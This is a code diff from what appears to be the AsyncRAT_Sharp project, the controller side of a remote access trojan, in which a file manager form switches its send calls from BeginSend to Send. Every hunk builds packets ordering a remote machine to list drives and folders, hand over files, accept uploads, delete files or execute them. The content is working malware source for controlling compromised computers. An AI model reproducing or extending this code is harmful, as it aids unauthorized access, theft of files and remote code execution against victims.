@@ -27,7 +27,7 @@ namespace AsyncRAT_Sharp.Forms
                     msgpack.ForcePathObject("Packet").AsString = "fileManager";
                     msgpack.ForcePathObject("Command").AsString = "getPath";
                     msgpack.ForcePathObject("Path").AsString = listView1.SelectedItems[0].ToolTipText;
-                    ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
+                    ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                     toolStripStatusLabel1.Text = listView1.SelectedItems[0].ToolTipText;
                 }
             }
@@ -47,7 +47,7 @@ namespace AsyncRAT_Sharp.Forms
                 {
                     msgpack.ForcePathObject("Packet").AsString = "fileManager";
                     msgpack.ForcePathObject("Command").AsString = "getDrivers";
-                    ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
+                    ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                     return;
                 }
                 path = path.Remove(path.LastIndexOfAny(new char[] { '\\' }, path.LastIndexOf('\\')));
@@ -55,14 +55,14 @@ namespace AsyncRAT_Sharp.Forms
                 msgpack.ForcePathObject("Command").AsString = "getPath";
                 msgpack.ForcePathObject("Path").AsString = path + "\\";
                 toolStripStatusLabel1.Text = path;
-                ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
+                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
             }
             catch
             {
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "fileManager";
                 msgpack.ForcePathObject("Command").AsString = "getDrivers";
-                ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
+                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                 return;
             }
 
@@ -81,7 +81,7 @@ namespace AsyncRAT_Sharp.Forms
                         msgpack.ForcePathObject("Packet").AsString = "socketDownload";
                         msgpack.ForcePathObject("File").AsString = itm.ToolTipText;
                         msgpack.ForcePathObject("DWID").AsString = dwid;
-                        ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
+                        ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                         this.BeginInvoke((MethodInvoker)(() =>
                         {
                             FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + dwid];
@@ -135,7 +135,7 @@ namespace AsyncRAT_Sharp.Forms
                             msgpack.ForcePathObject("Command").AsString = "reqUploadFile";
                             msgpack.ForcePathObject("ID").AsString = SD.Name;
                             SD.Show();
-                            ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
+                            ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                         }
                     }
                 }
@@ -156,7 +156,7 @@ namespace AsyncRAT_Sharp.Forms
                         msgpack.ForcePathObject("Packet").AsString = "fileManager";
                         msgpack.ForcePathObject("Command").AsString = "deleteFile";
                         msgpack.ForcePathObject("File").AsString = itm.ToolTipText;
-                        ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
+                        ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                     }
                 }
             }
@@ -171,7 +171,7 @@ namespace AsyncRAT_Sharp.Forms
                 msgpack.ForcePathObject("Packet").AsString = "fileManager";
                 msgpack.ForcePathObject("Command").AsString = "getPath";
                 msgpack.ForcePathObject("Path").AsString = toolStripStatusLabel1.Text;
-                ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
+                ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
             }
             catch
             {
@@ -192,7 +192,7 @@ namespace AsyncRAT_Sharp.Forms
                         msgpack.ForcePathObject("Packet").AsString = "fileManager";
                         msgpack.ForcePathObject("Command").AsString = "execute";
                         msgpack.ForcePathObject("File").AsString = itm.ToolTipText;
-                        ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
+                        ThreadPool.QueueUserWorkItem(C.Send, msgpack.Encode2Bytes());
                     }
                 }
             }
